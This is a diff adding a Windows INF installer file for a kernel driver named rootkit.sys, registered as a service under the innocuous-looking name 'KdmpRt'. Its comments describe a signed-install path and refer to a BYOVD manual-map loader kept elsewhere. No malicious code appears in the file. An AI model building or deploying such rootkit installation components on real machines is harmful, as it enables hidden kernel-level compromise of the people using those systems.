@@ -1,0 +1,46 @@
+;;==============================================================================
+;; rootkit/build/rootkit.inf
+;;------------------------------------------------------------------------------
+;; INF file for signed driver installation (Path A).
+;; Used with: signtool + sc create/start
+;;
+;; BYOVD manual-map path (Path B) is in usermode/loader.c
+;;==============================================================================
+
+[Version]
+Signature   = "$Windows NT$"
+Class       = System
+ClassGuid   = {4D36E97D-E325-11CE-BFC1-08002BE10318}
+Provider    = %ProviderName%
+CatalogFile = rootkit.cat
+DriverVer   = 09/10/2026,1.0.0.0
+
+[DestinationDirs]
+DefaultDestDir = 12  ; %SystemRoot%\System32\drivers
+
+[Manufacturer]
+%ProviderName% = RK,NTamd64
+
+[RK.NTamd64]
+%DeviceName% = RK_Install, rootkit
+
+[RK_Install.NT]
+CopyFiles = RK_CopyFiles
+
+[RK_CopyFiles]
+rootkit.sys
+
+[RK_Install.NT.Services]
+AddService = KdmpRt, 0x00000002, RK_Service
+
+[RK_Service]
+DisplayName    = %ServiceName%
+ServiceType    = 1              ; SERVICE_KERNEL_DRIVER
+StartType      = 3              ; SERVICE_DEMAND_START
+ErrorControl   = 1              ; SERVICE_ERROR_NORMAL
+ServiceBinary  = %12%\rootkit.sys
+
+[Strings]
+ProviderName = "KdmpRt"
+DeviceName   = "KdmpRt Device"
+ServiceName  = "KdmpRt"
